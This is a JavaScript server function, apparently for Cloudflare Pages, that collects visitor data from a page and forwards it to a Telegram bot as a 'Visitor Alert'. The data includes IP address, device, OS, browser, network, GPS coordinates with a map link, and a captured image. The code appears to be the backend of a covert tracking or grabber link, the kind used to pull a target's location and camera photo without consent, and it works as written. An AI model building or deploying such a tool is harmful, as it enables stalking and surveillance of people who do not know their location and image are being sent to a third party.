export async function onRequestPost({ request, env }) {
  let body = {};

  try {
    body = await request.json();
    const id = body.session_id;

    const ip = request.headers.get("CF-Connecting-IP");

    let session = await env.VISITOR_KV.get(id);
    session = session ? JSON.parse(session) : {};

    Object.assign(session, body, {
      ip,
      updated: new Date().toISOString()
    });

    await env.VISITOR_KV.put(id, JSON.stringify(session));

    // send only on final
    if (body.event === "final") {
      await safeTelegram(env, session);
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { "Content-Type": "application/json" }
    });

  } catch (err) {
    await safeTelegram(env, {
      error: err.message,
      raw: JSON.stringify(body)
    });

    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
}


// =======================
// TELEGRAM SAFE WRAPPER
// =======================
async function safeTelegram(env, s) {
  try {
    await sendTelegram(env, s);
  } catch (e) {
    console.log("Telegram failed (1st):", e);

    try {
      await sendTelegram(env, s);
    } catch (e2) {
      console.log("Telegram failed (retry):", e2);

      await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        body: new URLSearchParams({
          chat_id: env.CHAT_ID,
          text: "❌ Telegram failed twice:\n" + e2.message
        })
      });
    }
  }
}


// =======================
// TELEGRAM MAIN
// =======================
async function sendTelegram(env, s) {
  const map = s.lat && s.lng
    ? `https://maps.google.com/?q=${s.lat},${s.lng}`
    : "N/A";

  const text = `
🚨 <b>Visitor Alert</b>

🕒 <b>Time:</b> ${s.updated || "-"}
🌐 <b>IP:</b> ${s.ip || "-"}

📱 <b>Device:</b> ${s.device || "-"}
💻 <b>OS:</b> ${s.os || "-"}
🌍 <b>Browser:</b> ${s.browser || "-"}

📡 <b>Network:</b> ${s.network || "-"}

📍 <b>Location:</b>
Lat: ${s.lat || "-"}
Lng: ${s.lng || "-"}

🔗 <a href="${map}">Open Map</a>

${s.error ? `❌ <b>Error:</b> ${s.error}` : ""}
`;

  // IMAGE PATH
  if (s.image && s.image.startsWith("data:image")) {

    // avoid oversized payload
    if (s.image.length > 700000) {
      console.log("Image too large → fallback to text");
      return await sendText(env, text);
    }

    const res = await fetch(s.image);
    const blob = await res.blob();

    const form = new FormData();
    form.append("chat_id", env.CHAT_ID);
    form.append("photo", blob, "visitor.jpg");
    form.append("caption", text);
    form.append("parse_mode", "HTML");

    const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });

    const result = await tg.json();

    if (!result.ok) {
      throw new Error("Telegram photo error: " + JSON.stringify(result));
    }

  } else {
    return await sendText(env, text);
  }
}


// =======================
// TEXT FALLBACK
// =======================
async function sendText(env, text) {
  const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
    method: "POST",
    body: new URLSearchParams({
      chat_id: env.CHAT_ID,
      text: text,
      parse_mode: "HTML"
    })
  });

  const result = await tg.json();

  if (!result.ok) {
    throw new Error("Telegram text error: " + JSON.stringify(result));
  }

  return result;
}
